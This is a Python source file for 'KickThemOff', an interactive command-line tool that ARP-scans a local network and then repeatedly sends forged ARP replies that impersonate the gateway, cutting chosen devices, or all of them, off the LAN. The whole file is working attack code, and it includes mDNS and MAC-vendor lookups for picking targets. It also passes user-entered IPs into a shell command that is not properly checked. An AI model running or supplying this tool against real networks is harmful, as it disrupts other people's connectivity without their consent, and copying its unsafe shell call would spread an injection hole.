#!/usr/bin/env python
# -*- coding: utf-8 -*-
# kickthemoff.py
# author: kkevsterrr

"""
Based on KickThemOut by Nikolaos Kamarinakis (nikolaskam@gmail.com) & David Schütz (xdavid@protonmail.com)
"""

import time, os, sys, logging, math
from time import sleep
import urllib2 as urllib
from netaddr import IPAddress, IPNetwork

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

notRoot = False
try:
    if os.geteuid() != 0:
        print("\n{0}ERROR: KickThemOff must run as root. Try again with sudo/root:\n\t{1}$ sudo python kickthemoff.py{2}\n").format(RED, GREEN, END)
        notRoot = True
except:
    # User is probably on windows
    pass
if notRoot:
    raise SystemExit

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
try:
    from scapy.all import *
    import netifaces as ni
except:
    print("\n{0}ERROR: Requirements have not been properly satisfied. Please try running:\n\t{1}$ sudo pip install -r requirements.txt{2}").format(RED, GREEN, END)
    raise SystemExit



def heading():
    sys.stdout.write(GREEN + """
    █  █▀ ▄█ ▄█▄    █  █▀  ▄▄▄▄▀ ▄  █ ▄███▄   █▀▄▀█ ████▄ ▄████  ▄████  
    █▄█   ██ █▀ ▀▄  █▄█ ▀▀▀ █   █   █ █▀   ▀  █ █ █ █   █ █▀   ▀ █▀   ▀ 
    █▀▄   ██ █   ▀  █▀▄     █   ██▀▀█ ██▄▄    █ ▄ █ █   █ █▀▀    █▀▀    
    █  █  ▐█ █▄  ▄▀ █  █   █    █   █ █▄   ▄▀ █   █ ▀████ █      █      
      █    ▐ ▀███▀    █   ▀        █  ▀███▀      █         █      █     
     ▀               ▀            ▀             ▀           ▀      ▀    
    """ + END + BLUE +
    '\n' + '{0}Kick Devices Off Your LAN ({1}KickThemOff{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(98) +
    '\n' + 'Version: {0}1.0{1}\n'.format(YELLOW, END).center(86))

def arpscan(interface, netmask, my_ip, timeout=1):
    net = str(IPNetwork(my_ip+"/"+netmask).cidr)
    hostsList = []
    ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=False)
    for s, r in ans.res:
        mac = r.sprintf("%Ether.src%")
        ip = r.sprintf("%ARP.psrc%")
        line = r.sprintf("%Ether.src%  %ARP.psrc%")
        hostsList.append([ip, mac])
        try:
            hostname = socket.gethostbyaddr(r.psrc)
            line += "," + hostname[0]
        except socket.herror:
            pass
    return hostsList

def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
    ether = Ether()
    ether.src = my_mac
    ether.dst = target_mac
    
    arp = ARP()
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac
    arp.pdst = target_ip
    arp.hwdst = target_mac
    arp.op = 2

    packet = ether / arp
    sendp(x=packet, verbose=False)

def changeSettings():
    global APPLE_DIG_ENABLED, VENDOR_ID_ENABLED
    while True:
        print('\n\t{0}[{1}1{2}]{3} Change Interface').format(YELLOW, RED, YELLOW, WHITE)
        sleep(0.1)
        status = "Enable" if not APPLE_DIG_ENABLED else "Disable"
        print('\n\t{0}[{1}2{2}]{3} '+status+' Apple Device Name Dig').format(YELLOW, RED, YELLOW, WHITE)
        sleep(0.1)
        status = "Enable" if not VENDOR_ID_ENABLED else "Disable"
        print('\n\t{0}[{1}3{2}]{3} '+status+' Vendor MAC identification').format(YELLOW, RED, YELLOW, WHITE)
        sleep(0.1)
        print('\n\t{0}[{1}4{2}]{3} Return to menu\n').format(YELLOW, RED, YELLOW, WHITE)
        sleep(0.1)
        choice = raw_input(header)
        if choice == '1':
            changeInterface()
        elif choice == '2':
            if not VENDOR_ID_ENABLED and not APPLE_DIG_ENABLED:
                print(RED+"ERROR: "+END+" Vendor MAC idenfication must be enabled to enabled Apple Dig")
                continue
            
            APPLE_DIG_ENABLED = not APPLE_DIG_ENABLED
            status = "disabled" if not APPLE_DIG_ENABLED else "enabled"
            print(GREEN+"[*] Apple dig "+status+"."+END)
        elif choice == '3':
            if VENDOR_ID_ENABLED and APPLE_DIG_ENABLED:
                print(RED+"ERROR:" + END + " Apple dig must be disabled before disabling vendor MAC identification")
                continue

            VENDOR_ID_ENABLED = not VENDOR_ID_ENABLED
            status = "disabled" if not VENDOR_ID_ENABLED else "enabled"
            print(GREEN+"[*] Vendor MAC idenfication "+status+"."+END)
        elif choice == '4':
            return
def optionBanner():
    print('\nChoose option from menu:\n')
    sleep(0.1)
    print('\t{0}[{1}1{2}]{3} Initiate').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.1)
    print('\n\t{0}[{1}2{2}]{3} Change Settings').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.1)
    print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)

def changeInterface():
    print("Available interfaces: " + ", ".join(ni.interfaces()))
    global defaultInterface, defaultGatewayIP, defaultInterfaceMac
    sys.stdout.write(GREEN +"\nEnter a new interface to use: "+RED)
    iface = raw_input("")
    defaultInterface = iface
    print(GREEN+"New interface "+RED+iface+GREEN+" loaded.")
    defaultGatewayIP = getGatewayIP()
    defaultInterfaceMac = getDefaultInterfaceMAC()
    print_info()

def regenOnlineIPs():
    global onlineIPs
    global defaultGatewayMac
    onlineIPs = []
    for host in hostsList:
        onlineIPs.append(host[0])
        if host[0] == defaultGatewayIP:
            defaultGatewayMac = host[1]

def scanNetwork():
    global hostsList
    netmask = ni.ifaddresses(defaultInterface)[ni.AF_INET][0]["netmask"]
    hostsList = arpscan(defaultInterface, netmask, getMyIP())
    regenOnlineIPs()

def print_online_ips():
    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        comp_name = " ("+get_apple_name(onlineIPs[i])+")" if vendor == "Apple, Inc." else ""
        print("  [{0}" + str(i) + "{1}] {2:5}" + str(onlineIPs[i]) + "{3:6}\t"+ vendor + "{4}"+comp_name).format(YELLOW, WHITE, RED, GREEN, END)

def build_targets(hosts_list):
    targets = {}
    for ip in hosts_list:
        for host in hostsList:
            if host[0] == ip:
                targets[ip] = host[1]
    return targets


def kicksomeoff():
    print("\n{0}[*] ARP Scanning network for targets{1}...{2}\n").format(RED, GREEN, END)
    scanNetwork()
    
    print_online_ips()
   
    canBreak = False
    while not canBreak:
        try:
            choice = raw_input("\nEnter device numbers to target (comma-separated), a custom IP, or [a] to target all: ") 
            if re.match('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', choice) != None:
                targets={}
                result = sr1(ARP(op=ARP.who_has, psrc=getMyIP(), pdst=choice), timeout=5, verbose=False) 
                if not result:
                    print(RED+"ERROR: This address did not respond. (Is the IP address correct?)"+END)
                    continue
                mac = result.hwsrc
                targets[choice] = mac
                canBreak = True
            elif choice.upper() == "A" or choice.upper() == "ALL":
                targets = [host[0] for host in hostsList if host[0] != defaultGatewayIP]
                targets = build_targets(targets)
            elif ',' in choice:
                some_targets = choice.split(",") # TODO ERROR HANDLING
                canBreak = True
                targets = [onlineIPs[int(i)] for i in some_targets]
                targets = build_targets(targets)
            else:
                try:
                    int(choice)
                    targets = build_targets([onlineIPs[int(choice)]])
                    canBreak = True
                except:
                    print("{0}ERROR: Please enter a number.{1}\n").format(RED, END)
        except KeyboardInterrupt:
            return

    some_ipList = ""
    for ip in targets:
        some_ipList += GREEN + "'" + RED + ip + GREEN + "', "
    some_ipList = some_ipList[:-2] + END

    print("\n{0}Targets: {1}" + some_ipList).format(GREEN, END)
    print("\n{0}Spoofing started... {1}").format(GREEN, END)
    try:
        while True:
            for ip in targets:
                mac = targets[ip]
                sendPacket(defaultInterfaceMac, defaultGatewayIP, ip, mac)
            time.sleep(1)
    except KeyboardInterrupt:
        sys.stdout.write("\n{0}Re-arping{1} targets...{2}".format(RED, GREEN, END))
        reArp = 1
        while reArp != 10:
            sys.stdout.write(".")
            for ip in targets:
                sendPacket(defaultGatewayMac, defaultGatewayIP, ip, targets[ip])
            reArp += 1
            time.sleep(0.5)
        print("\n{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)

def getDefaultInterface():
    try:
        i = ni.gateways()["default"][ni.AF_INET][1]
        return i
    except:
        i = [x for x in ni.interfaces() if "lo" not in x][0]
        print(RED+"ERROR: "+END+" Could not find network interface with a gateway. Defaulting instead to interface "+GREEN+i+END+".")
        return i

def getGatewayIP():
    try:
        getGateway_p = [x[0] for x in ni.gateways()[2] if x[1] == defaultInterface][0]
        return getGateway_p
    except:
        print("\n{0}ERROR: Gateway IP for interface "+GREEN+defaultInterface+RED+" could not be obtained. Please enter IP manually.{1}\n").format(RED, END)
        header = ('{0}kickthemoff{1}> {2}Enter Gateway IP {3}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
        gatewayIP = raw_input(header)
        return gatewayIP

def getDefaultInterfaceMAC():
    try:
        defaultInterfaceMac = ni.ifaddresses(defaultInterface)[ni.AF_LINK][0]['addr']
	return defaultInterfaceMac
    except:
        print("\n{0}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
        header = ('{0}kickthemoff{1}> {2}Enter MAC Address {3}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
        defaultInterfaceMac = raw_input(header)
	return defaultInterfaceMac

def get_apple_name(ip):
    name = ""
    if APPLE_DIG_ENABLED:
        name, err = subprocess.Popen("dig +time=2 +tries=2 +short -x %s @224.0.0.251 -p 5353" % ip, shell=True, stdout=subprocess.PIPE).communicate()
    return name.strip()

def resolveMac(mac):
    if not VENDOR_ID_ENABLED:
        return ""

    try:
        print("retreiving vendor...")
        url = "http://macvendors.co/api/vendorname/"
        request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urllib.urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]
        return vendor
    except:
        return "N/A"

def getMyIP():
    return ni.ifaddresses(defaultInterface)[ni.AF_INET][0]['addr']

def print_info():
    print("\n{0}Using interface '{1}" + defaultInterface + "{2}' ("+RED+getMyIP()+GREEN+") with mac address '{3}" + defaultInterfaceMac + "{4}' to gateway '{5}"
        + defaultGatewayIP + "{6}'{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)


def main():
    global header
    heading()
    print_info()

    try:
        while True:

            optionBanner()

            header = ('{0}kickthemoff{1}> {2}'.format(BLUE, WHITE, END))
            choice = raw_input(header)

            if choice.upper() == 'E' or choice.upper() == 'EXIT':
                print('\n{0}Thanks for dropping by.'
                      '\nCatch ya later!{1}').format(GREEN, END)
                raise SystemExit
            elif choice == '2':
                changeSettings()
            elif choice == '1':
                kicksomeoff()
            elif choice.upper() == 'CLEAR':
                os.system("clear||cls")
            else:
                print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)

    except KeyboardInterrupt:
        print('\n\n{0}Thanks for dropping by.'
              '\nCatch ya later!{1}').format(GREEN, END)

if __name__ == '__main__':

    defaultInterface = getDefaultInterface()
    defaultGatewayIP = getGatewayIP()
    defaultInterfaceMac = getDefaultInterfaceMAC()
    APPLE_DIG_ENABLED, VENDOR_ID_ENABLED = False, False
    myIP = getMyIP()

    main()
